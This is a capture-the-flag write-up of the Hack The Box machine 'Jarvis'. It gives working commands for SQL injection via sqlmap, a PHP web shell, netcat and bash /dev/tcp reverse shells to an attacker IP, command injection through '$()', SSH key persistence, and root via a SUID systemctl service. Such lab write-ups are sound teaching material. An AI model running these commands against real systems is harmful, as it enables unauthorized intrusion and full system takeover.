# Recon
As usual we start with a port scan against the target:
```
sudo nmap -sCV -O -p- 10.10.10.143 -oN nmap.txt T5
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/1.png">

We discover 3 open ports. We'll start by investigating the webservice on port 80. In the background we'll start a ```gobuster``` scan in search for files and directories.

# Enumeration
```
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.143
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/2.png">

We've found a ```/phpmyadmin``` directory. When we browse to the directory we are welcomed with a login form. In the manuals we find out it's running version 4.8.0 which is known to have a remote code execution vulnerability. We do however need a username and password to use the exploit.

Trying ```supersecurehotel``` as username and password (found on the homepage) and other simple usernames and passwords didn't work.

```Whatweb``` didn't return much. There is a weird ```ironwaf```.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/3.png">

When we browse to the webservice on port ```64999``` we are immediately confronted with the following message:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/4.png">

# Initial Foothold (Method 1)
We can try to run ```sqlmap``` on the host. When we use ```crawl=2``` it'll also scan for links in pages. We combine this with ```--os-shell``` to hopefully get a shell on the host.
```
sqlmap -u http://10.10.10.143 --os-shell --crawl=2
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/5.png">

We can use this to get a more stable shell. We'll host a php reverse shell script on our attacking machine and download it using ```wget```. Then we browse to our page to get a reverse shell in return.

# Initial Foothold (Method 2)
Another method is to run ```sqlmap``` with the ```password``` argument to look for passwords om the database. 
```
sqlmap -u http://jarvis.htb/room.php?cod=1 --random-agent --passwords
```

We use the rockyou wordlist to crack the password and got a reult for user ```DBadmin```:
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/8.png">

We can now use these credentials to login the ```/phpmyadmin``` page and run sql commands on the target. 
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/9.png">

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/command.php"
```

And test it by browsing to:
```
http://10.10.10.143/command.php?cmd=whoami
```
Let's use this to create a reverse shell. With a listener ready on our attacking machine we run the following on our target:
```
http://10.10.10.143/command.php?cmd=nc%2010.10.14.10%204444%20-e%20/bin/sh
```
This gives us a revse shell as user ```www-data```.

# Lateral Movement
We can run ```simpler.py``` as ```pepper```:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/6.png">

We can see that certain syumbols are blocked for use. This doesn't count for ```$```. We can abuse this to run additional code and ultimately gives us a reverse shell as user ```pepper```. First we'll try it out by giving ```$(whoami)``` as IP argument: 
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/7.png">

That worked. We can now try to create a reverse shell:

```
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.10/4445 0>&1"' > /tmp/shell.sh
chmod +x /tmp/shell.sh
```
And then again run the following code while we have our ```nc``` listener ready:
```
/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```
And enter ```$(/tmp/shell.sh)``` as IP. Now we have a shell als ```pepper```.

To get a more persistent access we will create a ssh keypair by running ```ssh-keygen``` on our attacking machine and by saving the ```id_rsa.pub``` as ```/home/pepper/.ssh/authorized_keys```. Now we can use ssh to login as ```pepper```.

# Privilege escalation
When we look for files with SUID set we spot ```systemctl```. GTFOBins tells us we use this to elevate our privileges by creating our own service in a configuration file. We will use our earlier created shell file and have our listener ready before running the following commands:

```
echo '[Service]
Type=oneshot
ExecStart=/bin/sh/ -c "tmp/shell.sh"
[Install]
WantedBy=multi.user.target' > pwn.service
```
We can now link link the service:
```
systemctl link /home/pepper/pwn
```
And finally start the service:
```
systemctl start pwn.service
````

Now we have access as ```root```.






